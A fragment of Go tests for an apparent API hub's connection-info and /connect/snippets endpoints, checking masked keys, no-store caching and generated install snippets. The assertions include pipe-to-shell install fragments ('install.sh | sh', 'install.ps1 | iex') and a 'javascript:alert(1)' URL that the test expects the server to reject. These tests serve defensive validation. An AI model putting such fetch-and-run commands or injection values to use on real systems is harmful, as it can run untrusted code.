	if len(body.HubURLs) != 1 || body.HubURLs[0].URL != "http://127.0.0.1:8317" || body.HubURLs[0].Label != "This machine" {
		t.Errorf("hub urls = %+v", body.HubURLs)
	}
	if len(body.Keys) != 1 || body.Keys[0].Masked != "sk-...1234" || body.Keys[0].KeyID != KeyID(testKey) {
		t.Errorf("keys = %+v", body.Keys)
	}
	if !strings.Contains(body.Install.Linux, "install.sh | sh") || !strings.Contains(body.Install.Windows, "install.ps1 | iex") {
		t.Errorf("install = %+v", body.Install)
	}
}

func TestSnippetsRouteReturnsKeyWithNoStore(t *testing.T) {
	engine := routeEngine(t, "port: 8317\napi-keys: [\""+testKey+"\"]\n")
	request := func(body string) *httptest.ResponseRecorder {
		rr := httptest.NewRecorder()
		engine.ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/connect/snippets", strings.NewReader(body)))
		return rr
	}
	rr := request(`{"key_id":"` + KeyID(testKey) + `","hub_url":"https://h.example.com:8443"}`)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d body=%s", rr.Code, rr.Body)
	}
	if rr.Header().Get("Cache-Control") != "no-store" {
		t.Fatal("must be no-store")
	}
	var snippets Snippets
	if err := json.Unmarshal(rr.Body.Bytes(), &snippets); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(snippets.Linux, testKey) {
		t.Fatalf("snippets = %+v", snippets)
	}
	if rr := request(`{"key_id":"nope"}`); rr.Code != http.StatusNotFound {
		t.Fatalf("status = %d", rr.Code)
	}
	if rr := request(`{"key_id":"` + KeyID(testKey) + `","hub_url":"javascript:alert(1)"}`); rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d", rr.Code)
	}
	if rr := request(`{"key_id":"` + KeyID(testKey) + `"}`); rr.Code != http.StatusOK || !strings.Contains(rr.Body.String(), "http://127.0.0.1:8317") {
		t.Fatalf("default hub: status=%d body=%s", rr.Code, rr.Body)
	}
}
